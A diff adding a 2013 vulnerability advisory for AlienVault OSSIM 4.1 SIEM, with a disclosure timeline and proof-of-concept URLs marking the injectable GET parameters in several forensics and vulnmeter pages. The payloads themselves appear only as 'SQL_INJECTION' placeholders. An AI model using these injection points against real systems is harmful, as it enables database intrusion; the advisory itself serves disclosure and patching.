@@ -1,0 +1,70 @@
+# Title: 	Alienvault OSSIM Open Source SIEM 4.1 Multiple SQL Vulnerabilities
+# Date:         February 15, 2013
+# Author:       Glafkos Charalambous
+# Vendor:       AlienVault
+# Vendor URL:   http://www.alienvault.com
+# Reported:	February 17, 2013
+
+Timeline:
+---------
+17 Feb 2013: Vulnerability Reported to AlienVault
+19 Feb 2013: Sales Department replied if interested to migrate from OSSIM to AlienVault
+19 Feb 2013: Asked if there is someone that can handle the security issues
+22 Feb 2013: No Vendor response
+22 Jun 2013: Public Disclosure
+
+Vendor Description:
+-------------------
+OSSIM is the most widely used SIEM offering, thanks in no small part to the open source 
+community that has promoted its use. OSSIM provides all of the capabilities that a security 
+professional needs from a SIEM offering, event collection, normalization, correlation and 
+incident response - but it also does far more. Not simply satisfied with integrating data 
+from existing security tools, OSSIM is built on the Unified Security Management platform 
+which provides a common framework for the deployment, configuration, and management of your 
+security tools.
+
+
+Vulnerability Details:
+----------------------
+
+Blind SQL Injection vulnerabilities detected in the Alienvault OSSIM Open Source SIEM 4.1 product:
+
+Example POC:
+
+Get Parameter: sensor
+https://[host]/ossim/forensics/base_qry_main.php?new=1&num_result_rows=-1&sensor=SQL_INJECTION&submit=Query
+
+Get Parameter: tcp_flags
+https://[host]/ossim/forensics/base_stat_alerts.php?ossim/forensics/base_stat_alerts.php?current_view=-1
+&layer4=TCP&num_result_rows=-1&sort_order=occur_d&tcp_flags[0]=SQL_INJECTION&tcp_port[0][0]= 
+&tcp_port[0][1]=layer4_sport&tcp_port[0][2]==&tcp_port[0][3]=16315 &tcp_port[0][4]= &tcp_port[0][5]= &tcp_port_cnt=1
+
+Get Parameter: tcp_port
+https://[host]/ossim/forensics/base_stat_alerts.php?current_view=-1&layer4=TCP&num_result_rows=-1&sort_order=occur_d
+&tcp_flags[0]=&tcp_port[0][0]= &tcp_port[0][1]=layer4_sport&tcp_port[0][2]==&tcp_port[0][3]=16315 
+&tcp_port[0][4]=SQL_INJECTION&tcp_port[0][5]= &tcp_port_cnt=1
+
+GetParameter: ip_addr
+https://[host]/ossim/forensics/base_stat_ports.php?ip_addr[0][0]= &ip_addr[0][1]=ip_src&ip_addr[0][2]==
+&ip_addr[0][3]=192.168.0.11&ip_addr[0][8]= &ip_addr[0][9]=AND&ip_addr[1][0]= &ip_addr[1][1]=ip_dst&ip_addr[1][2]==
+&ip_addr[1][3]=0.0.0.0&ip_addr[1][8]=SQL_INJECTION&ip_addr[1][9]= &ip_addr_cnt=2&port_type=2&proto=6
+
+Get Parameter: port_type
+https://[host]/ossim/forensics/base_stat_ports.php?ip_addr[0][0]= &ip_addr[0][1]=ip_src&ip_addr[0][2]==
+&ip_addr[0][3]=0.0.0.0&ip_addr[0][8]= &ip_addr[0][9]=AND&ip_addr[1][0]= &ip_addr[1][1]=ip_dst&ip_addr[1][2]==
+&ip_addr[1][3]=0.0.0.0&ip_addr[1][8]= &ip_addr[1][9]= &ip_addr_cnt=2&port_type=SQL_INJECTION&proto=6
+
+
+SQL Injection vulnerabilities detected in the Alienvault OSSIM Open Source SIEM 4.1 product:
+
+Example POC:
+
+Get Parameter: sortby 
+https://[host]/ossim/vulnmeter/index.php?allres=1&op=search&rvalue=1&sortby=SQL_INJECTION&submit=Find&type=scantime&withoutmenu=1
+
+Get Parameter: rvalue
+https://[host]/ossim/vulnmeter/index.php?allres=1&op=search&rvalue=SQL_INJECTION&sortby=&submit=Find&type=scantime&withoutmenu=1
+
+
+
+
